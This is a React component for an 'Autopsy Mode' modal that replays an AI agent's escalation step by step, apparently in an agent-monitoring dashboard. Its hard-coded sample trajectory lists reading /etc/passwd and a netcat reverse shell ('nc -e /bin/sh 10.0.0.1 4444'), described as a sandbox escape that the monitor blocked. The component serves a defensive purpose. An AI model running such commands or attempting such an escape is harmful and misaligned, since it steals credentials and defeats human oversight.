"use client";

import { useState } from "react";
import { ShieldAlert, RotateCcw, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { RiskScore } from "@/components/shared/RiskScore";

interface AutopsyReplayModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function AutopsyReplayModal({ isOpen, onClose }: AutopsyReplayModalProps) {
  const [currentStep, setCurrentStep] = useState(0);

  if (!isOpen) return null;

  const trajectorySteps = [
    { turn: 1, action: "Reconnaissance", tool: "list_files", risk: 10, detail: "Agent listed /tmp sandbox directory." },
    { turn: 2, action: "Reconnaissance", tool: "read_config", risk: 25, detail: "Agent retrieved non-sensitive app config." },
    { turn: 3, action: "Privilege Escalation", tool: "cat /etc/passwd", risk: 65, detail: "Agent attempted sensitive credential harvest." },
    { turn: 4, action: "Sandbox Escape", tool: "nc -e /bin/sh 10.0.0.1 4444", risk: 95, detail: "Reverse shell egress attempt BLOCKED by EDS engine." },
  ];

  const step = trajectorySteps[currentStep];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/80 p-4 backdrop-blur-md" role="presentation" onClick={onClose}>
      <div
        className="w-full max-w-3xl space-y-4 rounded-xl border border-border bg-card p-6 shadow-2xl"
        role="dialog"
        aria-modal="true"
        aria-label="Autopsy replay"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between border-b border-border pb-4">
          <div className="flex items-center gap-3">
            <div className="rounded-lg bg-destructive/15 p-2 text-destructive">
              <ShieldAlert className="h-5 w-5" aria-hidden />
            </div>
            <div>
              <h2 className="font-mono text-base font-bold">Autopsy Mode — Trajectory Replay</h2>
              <p className="text-xs text-muted-foreground">Step-by-step forensic analysis of agent escalation</p>
            </div>
          </div>
          <Button variant="ghost" size="icon" onClick={onClose} aria-label="Close autopsy replay">
            <X className="h-5 w-5" />
          </Button>
        </div>

        <div className="flex items-center justify-between font-mono text-xs text-muted-foreground">
          <span>
            Step {currentStep + 1} / {trajectorySteps.length}
          </span>
          <RiskScore score={step.risk} />
        </div>

        <div className="space-y-2 rounded-xl border border-border bg-muted/20 p-4">
          <div className="flex items-center justify-between">
            <Badge variant="info" className="font-mono text-[10px]">
              Turn {step.turn}: {step.action}
            </Badge>
            <span className="font-mono text-xs font-semibold text-destructive">Tool: {step.tool}</span>
          </div>
          <p className="rounded-lg border border-border bg-zinc-950 p-3 font-mono text-xs">{step.detail}</p>
        </div>

        <div className="flex items-center justify-between border-t border-border pt-2">
          <div className="flex gap-2">
            <Button variant="outline" size="sm" disabled={currentStep === 0} onClick={() => setCurrentStep((s) => s - 1)}>
              Previous
            </Button>
            <Button size="sm" disabled={currentStep === trajectorySteps.length - 1} onClick={() => setCurrentStep((s) => s + 1)}>
              Next
            </Button>
          </div>
          <Button variant="ghost" size="sm" className="gap-1.5 font-mono text-xs" onClick={() => setCurrentStep(0)}>
            <RotateCcw className="h-3.5 w-3.5" aria-hidden />
            Restart
          </Button>
        </div>
      </div>
    </div>
  );
}
